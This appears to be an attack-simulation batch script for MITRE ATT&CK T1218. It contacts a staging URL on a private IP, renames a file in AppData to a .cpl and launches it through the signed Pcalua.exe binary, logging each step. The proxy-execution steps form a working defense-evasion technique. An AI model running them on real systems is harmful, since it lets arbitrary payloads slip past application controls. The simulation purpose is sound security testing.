@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\8921\a6af8aaa
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8921-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=project.txt
SET rgnpbq=8921
SET yhfbtr=%APPDATA%\!fkesh!\macula-simulations.log
SET qfnkda=Pcalua.exe
SET zrgwtp=pcafile.cpl
SET xnwvch=0
SET pdqwgf=

echo [!DATE! !TIME!][DEBUG][!eykalkg!]: heartbeat_start=!frytcn!>> "!yhfbtr!" 2>nul
curl -k -s -o nul "!frytcn!"
if errorlevel 1 (
 SET xnwvch=1
 SET pdqwgf=connection_failed
 echo [!DATE! !TIME!][DEBUG][!eykalkg!]: heartbeat_result=fail>> "!yhfbtr!" 2>nul
) else (
 echo [!DATE! !TIME!][DEBUG][!eykalkg!]: heartbeat_result=success>> "!yhfbtr!" 2>nul
)
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: file_rename_start=!ecrfwq!>> "!yhfbtr!" 2>nul
if exist "!douyiw!\!ecrfwq!" (
 ren "!douyiw!\!ecrfwq!" "!zrgwtp!"
 if errorlevel 1 (
  SET xnwvch=1
  SET pdqwgf=rename_failed
  echo [!DATE! !TIME!][DEBUG][!eykalkg!]: file_rename_result=fail>> "!yhfbtr!" 2>nul
 ) else (
  echo [!DATE! !TIME!][DEBUG][!eykalkg!]: file_rename_result=success>> "!yhfbtr!" 2>nul
 )
) else (
 SET xnwvch=1
 SET pdqwgf=file_missing
 echo [!DATE! !TIME!][DEBUG][!eykalkg!]: file_rename_result=fail>> "!yhfbtr!" 2>nul
)
echo [!DATE! !TIME!][DEBUG][!eykalkg!]: execution_start=!qfnkda!>> "!yhfbtr!" 2>nul
"!qfnkda!" -a "!douyiw!\!zrgwtp!"
if errorlevel 1 (
 SET xnwvch=1
 SET pdqwgf=execution_failed
 echo [!DATE! !TIME!][DEBUG][!eykalkg!]: execution_result=fail>> "!yhfbtr!" 2>nul
) else (
 echo [!DATE! !TIME!][DEBUG][!eykalkg!]: execution_result=success>> "!yhfbtr!" 2>nul
)
if !xnwvch!==1 (
 SET xnwvch=0
) else (
 SET xnwvch=1
 SET pdqwgf=
)
echo [!DATE! !TIME!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!xnwvch!:"!pdqwgf!">> "!yhfbtr!" 2>nul
ENDLOCAL